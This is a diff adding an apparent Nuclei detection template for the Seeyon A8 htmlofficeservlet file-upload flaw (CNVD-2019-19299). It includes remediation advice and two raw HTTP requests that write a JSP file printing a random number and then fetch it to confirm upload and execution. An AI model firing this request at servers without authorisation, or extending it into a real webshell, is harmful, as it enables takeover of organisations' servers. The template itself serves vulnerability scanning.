@@ -1,0 +1,60 @@
+id: CNVD-2019-19299
+info:
+  name: Seeyon A8 - Remote Code Execution
+  author:
+  - l0ne1y
+  description: |-
+    Seeyon A8 Arbitrary File Upload Leading to RCE
+    By exploiting this vulnerability, an unauthenticated attacker can remotely send a carefully crafted webshell file to gain control of the target server and execute arbitrary code on it.
+  severity: high
+  remediation: |-
+    #### Official remediation
+    Seeyon has released a patch to fix the vulnerability and set up a dedicated team to check users on the affected versions. Patches and update information can be obtained as follows:
+    1. Log in to the Seeyon customer service website (http://support.seeyon.com) to obtain the patch;
+    2. Follow the "Zhiyuan Internet Microservice" (Seeyon) WeChat official account to receive security update notifications in a timely manner;
+    3. For technical issues, contact Seeyon at Email: security@seeyon.com, or phone: 400-700-8822.
+
+
+    #### Temporary remediation is as follows:
+    1. Configure URL access control policies;
+    2. For Seeyon A8+ servers deployed on the public network, use ACLs to block external access to the "/seeyon/htmlofficeservlet" path;
+    3. Promptly detect and remove webshell files on the OA server.
+
+    Operators of information systems using Seeyon OA-A8 are advised to conduct self-assessments and promptly remediate any vulnerabilities found using the above measures.
+    In addition, Seeyon OA is widely deployed in the internal office systems of some enterprises and public institutions; timely self-assessment and remediation are recommended.
+requests:
+- matchers:
+  - type: dsl
+    condition: and
+    dsl:
+    - status_code_2 == 200
+    - contains(body_1, "htmoffice operate")
+    - contains(body_2, "{{randomValue}}")
+  raw:
+  - |
+    POST /seeyon/htmlofficeservlet HTTP/1.1
+    Host: {{Hostname}}
+    Pragma: no-cache
+    Cache-Control: no-cache
+    Upgrade-Insecure-Requests: 1
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q =0.8,application/signed-exchange;v=b3
+    Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
+    Connection: close
+
+    DBSTEP V3. 0 343 0 658 DBSTEP=OKMLlKlV
+    OPTION=S3WYOSWLBSGr
+    currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66
+    = WUghPB3szB3Xwg66 the CREATEDATE
+    recordID = qLSGw4SXzLeGw4V3wUw3zUoXwid6
+    originalFileId = wV66
+    originalCreateDate = wUghPB3szB3Xwg66
+    FILENAME = qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdb4o5nHzs
+    needReadFile = yRWZdAS6
+    originalCreateDate IZ = 66 = = wLSGP4oEzLKAz4
+    <%out.print({{randomValue}});%>
+  - |
+    GET /seeyon/test123456.jsp HTTP/1.1
+    Host: {{Hostname}}
+  req-condition: true
+variables:
+  randomValue: '{{rand_int(200000000, 210000000)}}'
